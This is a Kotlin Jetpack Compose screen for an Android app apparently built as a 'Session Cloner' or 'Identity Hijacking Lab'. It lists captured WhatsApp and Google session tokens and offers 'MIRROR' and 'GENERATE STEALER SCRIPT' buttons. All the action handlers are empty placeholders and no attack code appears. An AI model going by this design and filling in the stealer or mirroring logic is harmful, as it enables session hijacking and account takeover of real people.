package com.example.rabit.ui.zero_touch

import androidx.compose.animation.*
import androidx.compose.foundation.background
import androidx.compose.foundation.border
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.automirrored.filled.ArrowBack
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.example.rabit.ui.theme.*
import java.text.SimpleDateFormat
import java.util.*

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun SessionClonerScreen(
    viewModel: SessionClonerViewModel,
    onBack: () -> Unit
) {
    val sessions by viewModel.sessions.collectAsState()

    Scaffold(
        containerColor = Obsidian,
        topBar = {
            CenterAlignedTopAppBar(
                title = {
                    Column(horizontalAlignment = Alignment.CenterHorizontally) {
                        Text("SESSION CLONER", style = MaterialTheme.typography.titleSmall.copy(fontWeight = FontWeight.Black, color = Platinum))
                        Text("IDENTITY HIJACKING LAB", color = AccentBlue, fontSize = 9.sp, fontWeight = FontWeight.Bold)
                    }
                },
                navigationIcon = {
                    IconButton(onClick = onBack) {
                        Icon(Icons.AutoMirrored.Filled.ArrowBack, null, tint = Platinum)
                    }
                },
                actions = {
                    IconButton(onClick = { viewModel.generateDemoSessions() }) {
                        Icon(Icons.Default.Bolt, null, tint = AccentBlue)
                    }
                },
                colors = TopAppBarDefaults.centerAlignedTopAppBarColors(containerColor = Color.Transparent)
            )
        }
    ) { padding ->
        Column(modifier = Modifier.fillMaxSize().padding(padding).padding(16.dp)) {
            // --- Header Info ---
            Card(
                colors = CardDefaults.cardColors(containerColor = AccentBlue.copy(alpha = 0.05f)),
                shape = RoundedCornerShape(16.dp),
                border = androidx.compose.foundation.BorderStroke(1.dp, AccentBlue.copy(alpha = 0.1f))
            ) {
                Row(modifier = Modifier.padding(16.dp), verticalAlignment = Alignment.CenterVertically) {
                    Icon(Icons.Default.Fingerprint, null, tint = AccentBlue, modifier = Modifier.size(32.dp))
                    Spacer(Modifier.width(16.dp))
                    Column {
                        Text("ACTIVE CLONES", color = Platinum, fontWeight = FontWeight.Black, fontSize = 14.sp)
                        Text("${sessions.size} sessions currently mirrored", color = Silver, fontSize = 11.sp)
                    }
                }
            }

            Spacer(Modifier.height(24.dp))

            Text("INTERCEPTED SESSIONS", color = Silver, fontSize = 11.sp, fontWeight = FontWeight.Bold)
            Spacer(Modifier.height(12.dp))

            if (sessions.isEmpty()) {
                Box(modifier = Modifier.weight(1f).fillMaxWidth(), contentAlignment = Alignment.Center) {
                    Text("No active sessions captured.", color = Silver.copy(alpha = 0.3f), fontSize = 12.sp)
                }
            } else {
                LazyColumn(modifier = Modifier.weight(1f), verticalArrangement = Arrangement.spacedBy(12.dp)) {
                    items(sessions) { session ->
                        SessionCard(session)
                    }
                }
            }

            Spacer(Modifier.height(16.dp))

            Button(
                onClick = { /* Generate Script Action */ },
                modifier = Modifier.fillMaxWidth().height(52.dp),
                colors = ButtonDefaults.buttonColors(containerColor = AccentBlue),
                shape = RoundedCornerShape(12.dp)
            ) {
                Icon(Icons.Default.Code, null)
                Spacer(Modifier.width(8.dp))
                Text("GENERATE STEALER SCRIPT", fontWeight = FontWeight.Black)
            }
        }
    }
}

@Composable
fun SessionCard(session: CapturedSession) {
    Surface(
        color = Surface1.copy(alpha = 0.4f),
        shape = RoundedCornerShape(16.dp),
        border = androidx.compose.foundation.BorderStroke(1.dp, BorderColor.copy(alpha = 0.1f)),
        modifier = Modifier.fillMaxWidth()
    ) {
        Column(modifier = Modifier.padding(16.dp)) {
            Row(verticalAlignment = Alignment.CenterVertically) {
                Icon(
                    when(session.platform) {
                        "WhatsApp" -> Icons.Default.Chat
                        "Google" -> Icons.Default.AccountCircle
                        else -> Icons.Default.Language
                    },
                    null,
                    tint = SuccessGreen,
                    modifier = Modifier.size(20.dp)
                )
                Spacer(Modifier.width(12.dp))
                Column {
                    Text(session.target, color = Platinum, fontWeight = FontWeight.Black, fontSize = 14.sp)
                    Text(session.platform, color = Silver, fontSize = 10.sp)
                }
                Spacer(Modifier.weight(1f))
                Text(session.status, color = SuccessGreen, fontSize = 10.sp, fontWeight = FontWeight.Bold)
            }
            
            Spacer(Modifier.height(12.dp))
            
            Box(
                modifier = Modifier
                    .fillMaxWidth()
                    .background(Color.Black.copy(alpha = 0.3f), RoundedCornerShape(8.dp))
                    .padding(8.dp)
            ) {
                Text(
                    session.token.take(40) + "...",
                    color = AccentBlue,
                    fontSize = 10.sp,
                    fontFamily = FontFamily.Monospace,
                    maxLines = 1
                )
            }
            
            Spacer(Modifier.height(12.dp))
            
            Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                OutlinedButton(
                    onClick = { /* Mirror Action */ },
                    modifier = Modifier.weight(1f),
                    colors = ButtonDefaults.outlinedButtonColors(contentColor = Platinum),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Icon(Icons.Default.Visibility, null, modifier = Modifier.size(16.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("MIRROR", fontSize = 11.sp)
                }
                OutlinedButton(
                    onClick = { /* Refresh Action */ },
                    modifier = Modifier.weight(1f),
                    colors = ButtonDefaults.outlinedButtonColors(contentColor = Platinum),
                    shape = RoundedCornerShape(8.dp)
                ) {
                    Icon(Icons.Default.Refresh, null, modifier = Modifier.size(16.dp))
                    Spacer(Modifier.width(8.dp))
                    Text("SYNC", fontSize = 11.sp)
                }
            }
        }
    }
}
